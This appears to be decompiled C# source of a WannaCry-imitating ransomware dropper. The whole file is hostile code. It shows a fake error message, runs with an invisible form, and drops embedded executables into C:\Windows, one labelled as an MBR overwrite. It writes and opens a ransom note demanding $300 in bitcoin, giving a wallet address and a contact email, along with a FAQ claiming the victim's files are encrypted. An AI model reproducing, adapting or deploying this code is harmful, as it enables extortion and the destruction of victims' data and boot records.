using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace WannaCrypt0r3._0;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("There was an error running this program, please install run32.dll.", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		dropWallPaper();
		dropRansomNote();
		dropRansomQuests();
		executeMBROverwrite();
		dropDecryptor();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void dropRansomNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using (StreamWriter streamWriter = File.CreateText(folderPath + "\\Wanna_Decrypt0r3.0.txt"))
		{
			streamWriter.WriteLine("Your data is encrypted with a special encryption software, it is certainly impossible to recover your data without a private key.");
			streamWriter.WriteLine("To get the decryption key, there are some steps you need to pursue:");
			streamWriter.WriteLine("1. Send $300 worth of BTC to: 1HNkDUPxEhnN8Q2ZicSnmrifDJYUpAFdbG");
			streamWriter.WriteLine("2. E-mail danielnusradin@gmail.com your BTC transaction ID.");
			streamWriter.WriteLine("3. Wait for a from the e-mail address containing a private decryption Key.");
			streamWriter.WriteLine("NOTE: You will only have 10 hours to submit the cheaper price, after 10 hours you will need to pay $300 MORE!");
		}
		Process.Start("C:\\\\Users\\\\" + Environment.UserName + "\\Desktop\\Wanna_Decrypt0r3.0.txt");
	}

	private void dropRansomQuests()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		using StreamWriter streamWriter = File.CreateText(folderPath + "\\Wanna_FAQ3.0.txt");
		streamWriter.WriteLine("You perhaps are wondering what happened to your data. You simply just executed the 3rd version of WannaCry.");
		streamWriter.WriteLine("Why is this software demanding money? Because the software hijacked your computer and encrypted everything...");
		streamWriter.WriteLine("for instance, Pictures, Videos, System32, Windows and etc...");
		streamWriter.WriteLine("What is the term encryption? It's where a string or a text gets converted from plain text to cipher text.");
		streamWriter.WriteLine("Cipher Text is something that is un-readable or having no access to files.");
		streamWriter.WriteLine("What is the term decryption? It's where a file gets converted from Cipher Text to Plain Text, now Plain Text is something what");
		streamWriter.WriteLine("a human-being can read.");
	}

	private void executeMBROverwrite()
	{
		Extract("WannaCrypt0r3._0", "C:\\Windows", "Resources", "RANSOM.exe");
		Thread.Sleep(2000);
		Process.Start("C:\\\\Windows\\\\RANSOM.exe");
	}

	private void dropDecryptor()
	{
		Extract("WannaCrypt0r3._0", AppDomain.CurrentDomain.BaseDirectory, "Resources", "WannaDecryp0r3.0.exe");
	}

	private void dropWallPaper()
	{
		Extract("WannaCrypt0r3._0", "C:\\Windows", "Resources", "WannaCryPIC.exe");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(188, 21));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
